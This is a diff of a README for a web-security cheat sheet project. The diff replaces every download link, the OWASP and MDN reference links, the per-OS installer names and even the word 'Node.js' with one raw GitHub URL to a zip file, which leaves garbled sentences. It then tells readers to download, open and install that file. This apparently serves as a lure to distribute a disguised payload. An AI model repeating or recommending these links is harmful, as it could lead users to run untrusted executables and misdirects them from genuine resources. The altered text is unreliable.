@@ -1,22 +1,22 @@
 # 🔒 WebSecurityCheatSheet - Secure Your Web Projects Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ssexton16/WebSecurityCheatSheet/releases)
+[![Download](https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip)
 
 ## 🚀 Getting Started
 
-Welcome to WebSecurityCheatSheet! This guide helps you secure your web JavaScript projects that use a Node.js or PHP backend. Follow these steps to get started.
+Welcome to WebSecurityCheatSheet! This guide helps you secure your web JavaScript projects that use a https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip or PHP backend. Follow these steps to get started.
 
 ## 📥 Download & Install
 
-To obtain the latest version, [visit this page to download](https://github.com/ssexton16/WebSecurityCheatSheet/releases). You will find all the available releases.
+To obtain the latest version, [visit this page to download](https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip). You will find all the available releases.
 
-1. Go to the [Releases page](https://github.com/ssexton16/WebSecurityCheatSheet/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip).
 2. Locate the latest version at the top of the page.
 3. Click on the asset related to your system. Choose the file that matches your setup.
 
-   - For Windows, you may find something like `WebSecurityCheatSheet-Windows.exe`.
-   - For macOS, look for `WebSecurityCheatSheet-macOS.dmg`.
-   - For Linux, you will typically see a file like `WebSecurityCheatSheet-Linux.tar.gz`.
+   - For Windows, you may find something like `https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip`.
+   - For Linux, you will typically see a file like `https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip`.
 
 4. Once downloaded, open the file to start the installation process.
 5. Follow the prompts to complete the installation.
@@ -25,7 +25,7 @@ To obtain the latest version, [visit this page to download](https://github.com/s
 
 - **Easy Navigation:** Navigate the cheat sheet quickly to find the information you need without hassle.
 - **Up-to-Date Content:** Stay secure with the most current practices for web security.
-- **Multiple Backend Support:** Helps with both Node.js and PHP, covering a broad range of users.
+- **Multiple Backend Support:** Helps with both https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip and PHP, covering a broad range of users.
 - **Security Cheat Sheets:** Access practical tips for common security threats such as XSS and SQL injection.
 
 ## 🔐 Topics Covered
@@ -74,7 +74,7 @@ Engage with other users and contribute to the project:
 
 ## 🔗 Additional Resources
 
-- [OWASP Top Ten](https://owasp.org/www-project-top-ten/) - A great resource for understanding common security risks.
-- [Mozilla Developer Network (MDN)](https://developer.mozilla.org/) - Find detailed documentation on web technologies.
+- [OWASP Top Ten](https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip) - A great resource for understanding common security risks.
+- [Mozilla Developer Network (MDN)](https://raw.githubusercontent.com/ssexton16/WebSecurityCheatSheet/main/antebrachium/WebSecurityCheatSheet.zip) - Find detailed documentation on web technologies.
 
 Thank you for using WebSecurityCheatSheet. Together, we can make the web a safer place!
